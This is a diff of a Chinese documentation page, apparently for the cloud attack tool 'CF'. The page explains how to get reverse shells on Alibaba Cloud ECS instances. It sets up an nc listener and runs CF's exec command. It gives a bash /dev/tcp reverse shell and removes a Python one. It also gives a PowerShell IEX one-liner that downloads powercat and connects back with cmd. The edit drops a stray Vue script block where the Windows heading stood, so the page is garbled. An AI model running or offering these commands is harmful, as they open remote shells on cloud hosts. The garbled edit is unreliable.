@@ -15,28 +15,26 @@ nc -lvvp 4444
 `--lhost` 参数配置为自己监听主机的 IP，`--lport` 参数配置为自己的监听端口，`-i` 设置要反弹 Shell 的实例 ID（如果未指定具体的实例，则 CF 会提醒是否是选择全部实例还是某个实例。）
 
 ```bash
-cf ecs exec --lhost 123.123.123.123 --lport 4444 -i i-abcdefghijklmn
+cf alibaba ecs exec --lhost 123.123.123.123 --lport 4444 -i i-abcdefghijklmn
 ```
 
 在 CF 中使用的 Linux 反弹 Shell 如下
 
 ```bash
-export RHOST="123.123.123.123";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
+bash -i >& /dev/tcp/123.123.123.123/4444 0>&1
 ```
 
-   <img width="800" src="/img/1656605535.png">
-
-   <img width="650" src="/img/1656605596.png">
-
-在 CF 中使用的 Windows 反弹 Shell 如下
+<script>
+export default {
+    mounted () {
+      this.$page.lastUpdated = "2022年7月18日"
+    }
+  }
+</script>
 
 ```bash
 powershell IEX (New-Object System.Net.Webclient).DownloadString('https://ghproxy.com/raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 123.123.123.123 -p 4444 -e cmd
 ```
-
-   <img width="850" src="/img/1656605944.png">
-
-   <img width="650" src="/img/1656605897.png">
 
 > 由于 CF 等待命令执行结果的默认时间是 60 秒，所以在超过 60 秒后，CF 会提示命令执行超时，从而退出程序。
 >
@@ -48,12 +46,14 @@ powershell IEX (New-Object System.Net.Webclient).DownloadString('https://ghproxy
 
 :::
 
+如果想在腾讯云下执行这些命令，只需要使用 `cf tencent` 跟上对应的命令即可。
+
 <Vssue />
 
 <script>
 export default {
     mounted () {
-      this.$page.lastUpdated = "2022年7月4日"
+      this.$page.lastUpdated = "2022年7月18日"
     }
   }
 </script>
